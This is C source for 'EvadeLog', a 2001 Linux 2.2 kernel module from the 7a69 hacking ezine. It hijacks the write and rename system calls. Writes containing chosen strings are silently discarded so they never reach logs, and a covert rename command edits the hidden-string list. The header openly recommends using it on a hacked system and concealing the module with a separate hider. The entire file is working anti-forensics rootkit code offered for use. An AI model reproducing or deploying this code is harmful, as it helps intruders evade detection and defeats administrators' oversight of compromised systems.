/*
 * TILE: EvadeLog v1.0 <14/6/2001>
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * DESCR: This is a log evader LKM. In this module I filter all write syscalls
 *        that have got a string in hide list. The usage is very easy, you can
 *        add/del strings to hide list using mv UNIX command. See that.
 *
 *        root@donasec.com ~# insmod evadelog.o ins=mete del=saca [-f]
 *        root@donasec.com ~#
 *
 *        You'll avoid that string must be printed using "mv <string> mete"
 *
 * RECOM: If you use this LKM in a hacked system I recomend revise the
 *        source (script-kidiie sux) and hider this LKM using hider.c :)
 *
 * TESTED: This LKM have been tested without problems on:
 *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
 *           - Linux Kernel 2.2.18 (Debian 2.2)
 */

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/mm.h>

#include <sys/syscall.h>

#define _7A69SOFT_
#define CODER       "Ripe"
#define DEBUGMODE

#define DEF_INS     "insert_str"
#define DEF_DEL     "delete_str"

extern void *sys_call_table[];
char *ins;
char *del;

struct {
  char *ins;
  char *del;
} status;

typedef struct {
  char *str;
  struct lstr *next;
} lstr;

lstr *s_list;

int (*o_rename)(const char *oldpath, const char *newpath);
int (*o_write)(int fd, const void *buf, int count);

void my_bzero(char *buf, int size) {
  memset(buf, 0, size);
}
void add_str(char *str) {
  lstr *ptr=s_list;
#ifdef DEBUGMODE
  printk("(EL) Adding \"%s\" string to hide list\n", str);
#endif
  if (is_str(str)==1) return;
  if (ptr) {
    while (ptr->next) {
      if (!strcmp(ptr->str, str)) return;
      ptr=(lstr *)ptr->next;
    }
    ptr->next=(struct lstr *)kmalloc(sizeof(lstr), GFP_KERNEL);
    ptr=(lstr *)ptr->next;
    ptr->str=(char *)kmalloc(strlen(str)+1, GFP_KERNEL);
    strcpy(ptr->str, str);
    ptr->next=NULL;
  } else {
    s_list=(lstr *)kmalloc(sizeof(lstr), GFP_KERNEL);
    ptr=s_list;
    ptr->str=(char *)kmalloc(strlen(str)+1, GFP_KERNEL);
    strcpy(ptr->str, str);
    ptr->next=NULL;
  }
  return;
}

void del_str(char *str) {
  lstr *ptr=s_list, *ptr2;
#ifdef DEBUGMODE
  printk("(EL) Deleting \"%s\" string from hide list\n", str);
#endif
  if (!ptr) return;
  if (!strcmp(ptr->str, str)) {
    s_list=(lstr *)ptr->next;
    kfree(ptr->str);
    kfree(ptr);
    return;
  }
  while(ptr) {
    if (!strcmp(ptr->str, str)) break;
    ptr2=ptr;
    ptr=(lstr *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    kfree(ptr->str);
    kfree(ptr);
  }
  return;
}

int is_str(char *str) {
  lstr *ptr=s_list;
  while(ptr) {
    if (!strcmp(ptr->str, str)) return(1);
    ptr=(lstr *)ptr->next;
  }
  return(0);
}

int hide_str(char *buf) {
  lstr *ptr=s_list;
  if (!ptr) return(0);
  while(ptr) {
    if (strstr(buf, ptr->str)) return(1);
    ptr=(lstr *)ptr->next;
  }
  return(0);
}

int my_rename(const char *oldpath, const char *newpath) {
  if (!strcmp(newpath, status.ins)) {
    add_str((char *)oldpath);
    return(0);
  }
  if (!strcmp(newpath, status.del)) {
    del_str((char *)oldpath);
    return(0);
  }
  return((*o_rename)(oldpath, newpath));
}
int my_write(int fd, const void *buf, int count) {
  int ret;
  char *my_buf;
  my_buf=(char *)kmalloc(count+1, GFP_KERNEL);
  my_bzero(my_buf, count+1);
  memcpy(my_buf, buf, count);
  if (ret=hide_str((char *)my_buf)) {
    kfree(my_buf);
    return(count);
  }
  kfree(my_buf);
  return((*o_write)(fd, buf, count));
}

int init_module() {
  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
  strcpy(status.ins, DEF_INS);
  strcpy(status.del, DEF_DEL);
  if (ins) {
    kfree(status.ins);
    status.ins=ins;
  }
  if (del) {
    kfree(status.del);
    status.del=del;
  }
  o_rename=sys_call_table[__NR_rename];
  o_write=sys_call_table[__NR_write];
  sys_call_table[__NR_rename]=my_rename;
  sys_call_table[__NR_write]=my_write;
#ifdef DEBUGMODE
  printk("(EL) EvadeLog by Ripe - <ripe@7a69ezine.org>\n");
  printk("(EL) Loaded!\n");
#endif
  return(0);
}

void cleanup_module() {
  sys_call_table[__NR_rename]=o_rename;
  sys_call_table[__NR_write]=o_write;
#ifdef DEBUGMODE
  printk("(EL) EvadeLog by Ripe - <ripe@7a69ezine.org>\n");
  printk("(EL) UnLoaded!\n");
#endif
}

MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
MODULE_DESCRIPTION("hack: Evading log");
MODULE_PARM(ins, "s");
MODULE_PARM(del, "s");
